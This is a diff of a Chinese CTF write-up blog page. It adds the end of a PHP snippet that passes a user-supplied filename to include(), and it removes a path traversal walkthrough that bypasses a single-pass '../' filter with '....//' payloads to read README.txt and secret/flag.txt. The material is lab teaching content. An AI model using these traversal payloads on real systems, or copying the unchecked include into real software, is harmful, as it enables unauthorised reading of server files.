+</span><span id="__span-62-46"><a id="__codelineno-62-46" name="__codelineno-62-46" href="#__codelineno-62-46"></a><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s1">'files/'</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-62-47"><a id="__codelineno-62-47" name="__codelineno-62-47" href="#__codelineno-62-47"></a>    <span class="nv">$target</span> <span class="o">=</span> <span class="s1">'files/'</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">;</span>
+</span><span id="__span-62-48"><a id="__codelineno-62-48" name="__codelineno-62-48" href="#__codelineno-62-48"></a><span class="p">}</span>
+</span><span id="__span-62-49"><a id="__codelineno-62-49" name="__codelineno-62-49" href="#__codelineno-62-49"></a>
+</span><span id="__span-62-50"><a id="__codelineno-62-50" name="__codelineno-62-50" href="#__codelineno-62-50"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$target</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-62-51"><a id="__codelineno-62-51" name="__codelineno-62-51" href="#__codelineno-62-51"></a>    <span class="k">echo</span> <span class="s2">"未找到指定的文档，请确认文件名称是否正确。</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+</span><span id="__span-62-52"><a id="__codelineno-62-52" name="__codelineno-62-52" href="#__codelineno-62-52"></a>    <span class="k">exit</span><span class="p">;</span>
+</span><span id="__span-62-53"><a id="__codelineno-62-53" name="__codelineno-62-53" href="#__codelineno-62-53"></a><span class="p">}</span>
+</span><span id="__span-62-54"><a id="__codelineno-62-54" name="__codelineno-62-54" href="#__codelineno-62-54"></a>
+</span><span id="__span-62-55"><a id="__codelineno-62-55" name="__codelineno-62-55" href="#__codelineno-62-55"></a><span class="c1">// 输出文档内容</span>
+</span><span id="__span-62-56"><a id="__codelineno-62-56" name="__codelineno-62-56" href="#__codelineno-62-56"></a><span class="k">include</span><span class="p">(</span><span class="nv">$target</span><span class="p">);</span>
 </span></code></pre></div>
 </details>
     
@@ -6156,140 +6455,6 @@
 </span><span id="__span-65-112"><a id="__codelineno-65-112" name="__codelineno-65-112" href="#__codelineno-65-112"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 </details>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-29 00:00:00+00:00">2026-10-29</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../category/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" class="md-meta__link">路径遍历</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 2 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="writeup"><a class="toclink" href="../../stitch-file-previewer/">史迪仔的文件预览器 — Writeup</a></h2>
-<blockquote>
-<p><strong>题目类型</strong>：Web — 目录穿越（Path Traversal）</p>
-<p><strong>题目地址</strong>：<code>http://80-e887e1a6-2d07-4b5b-9e6e-5d3e06543451.challenge.ctfplus.cn/</code></p>
-<p><strong>Flag</strong>：<code>flag{1f0be3ba-b8f6-4a5a-9b05-c8d69e8769fd}</code></p>
-</blockquote>
-<hr />
-<h3 id="_1"><a class="toclink" href="../../stitch-file-previewer/#_1">题目概述</a></h3>
-<p>页面是一个"文件预览器"，输入文件名即可查看实验室资料。默认提供示例文件 <code>hello.txt</code>。</p>
-<hr />
-<h3 id="_2"><a class="toclink" href="../../stitch-file-previewer/#_2">解题过程</a></h3>
-<h4 id="step-1"><a class="toclink" href="../../stitch-file-previewer/#step-1">Step 1：查看默认文件</a></h4>
-<p>先访问默认的 <code>hello.txt</code>，内容如下：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Hello, ZeroG!
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Welcome to PwnStars Cybersecurity Lab.
-</span></code></pre></div>
-<p>没有有用信息，只是普通的欢迎语。</p>
-<h4 id="step-2"><a class="toclink" href="../../stitch-file-previewer/#step-2">Step 2：查看源码，发现线索</a></h4>
-<p>右键查看页面源代码，在 HTML 底部发现一行注释：</p>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cm">&lt;!-- TODO: README.txt 后续需要整理 --&gt;</span>
-</span></code></pre></div>
-<p><img alt="源码中的注释" src="../../../assets/images/stitch-file-previewer/02-source-comment.png" /></p>
-<p>这说明服务器上存在一个 <code>README.txt</code> 文件，但页面上没有直接暴露。</p>
-<h4 id="step-3-readmetxt"><a class="toclink" href="../../stitch-file-previewer/#step-3-readmetxt">Step 3：直接读取 README.txt — 失败</a></h4>
-<p>在文件名输入框中输入 <code>README.txt</code>，返回：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>File not found.
-</span></code></pre></div>
-<p>说明 README.txt 不在当前可读目录中。</p>
-<h4 id="step-4"><a class="toclink" href="../../stitch-file-previewer/#step-4">Step 4：尝试目录穿越</a></h4>
-<p>既然文件不在当前目录，尝试使用 <code>../</code> 进行目录穿越：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>../README.txt
-</span></code></pre></div>
-<p>仍然返回 <code>File not found.</code>，说明服务器对 <code>../</code> 进行了过滤（替换为空）。</p>
-<h4 id="step-5-readmetxt"><a class="toclink" href="../../stitch-file-previewer/#step-5-readmetxt">Step 5：绕过过滤 — 成功读取 README.txt</a></h4>
-<p>服务器只做了一次 <code>../</code> → 空的替换，可以利用双写绕过。输入：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>....//README.txt
-</span></code></pre></div>
-<p>服务器将中间的 <code>../</code> 删除后，剩余字符重新拼成 <code>../README.txt</code>，成功读到文件内容：</p>
-<p><img alt="读取到 README.txt" src="../../../assets/images/stitch-file-previewer/03-readme.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Stitch File Preview System
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>Public files are stored in /files/.
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>For administrators:
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>Sensitive files are stored in /secret/.
-</span></code></pre></div>
-<p>README.txt 揭示了目录结构：</p>
-<ul>
-<li>公开文件存储在 <code>/files/</code></li>
-<li><strong>敏感文件存储在 <code>/secret/</code></strong></li>
-</ul>
-<h4 id="step-6-secret-flag"><a class="toclink" href="../../stitch-file-previewer/#step-6-secret-flag">Step 6：读取 /secret/ 下的 flag</a></h4>
-<p>既然知道敏感文件在 <code>/secret/</code> 目录下，CTF 中常见的 flag 文件名就是 <code>flag.txt</code>。使用同样的绕过方式构造路径：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>....//secret/flag.txt
-</span></code></pre></div>
-<p>成功拿到 flag：</p>
-<p><img alt="拿到 flag" src="../../../assets/images/stitch-file-previewer/04-flag.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>flag{1f0be3ba-b8f6-4a5a-9b05-c8d69e8769fd}
-</span></code></pre></div>
-<hr />
-<h3 id="_3"><a class="toclink" href="../../stitch-file-previewer/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>访问 hello.txt（无有用信息）
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>  → 查看源码，发现 HTML 注释提到 README.txt
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>    → 直接读 README.txt 失败（文件不在当前目录）
-</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>      → 尝试 ../ 目录穿越，失败（被过滤）
-</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>        → 用 ....// 双写绕过过滤，成功读取 README.txt
-</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>          → 发现敏感文件在 /secret/ 目录
-</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>            → ....//secret/flag.txt 读到 flag
-</span></code></pre></div>
-<h4 id="_4"><a class="toclink" href="../../stitch-file-previewer/#_4">漏洞原理</a></h4>
-<p>服务器对用户输入的 <code>file</code> 参数进行了简单的过滤 —— 将 <code>../</code> 替换为空字符串。但这个过滤<strong>只执行一次</strong>，攻击者可以通过双写 <code>....//</code> 来绕过：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>输入:      ....//README.txt
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>过滤后:    ../README.txt    （中间的 ../ 被删除，两侧的 . 和 / 重新拼合）
-</span></code></pre></div>
-<h4 id="_5"><a class="toclink" href="../../stitch-file-previewer/#_5">关键知识点</a></h4>
-<table>
-<thead>
-<tr>
-<th>知识点</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>查看源码</td>
-<td>HTML 注释中经常藏有线索</td>
-</tr>
-<tr>
-<td>目录穿越</td>
-<td>利用 <code>../</code> 跳出当前目录读取其他文件</td>
-</tr>
-<tr>
-<td>过滤绕过</td>
-<td>双写 <code>....//</code> 绕过单次 <code>../</code> 替换过滤</td>
-</tr>
-<tr>
-<td>信息收集</td>
-<td>利用已读到的文件内容（README.txt）获取目录结构信息</td>
-</tr>
-</tbody>
-</table>
     
     
   </div>
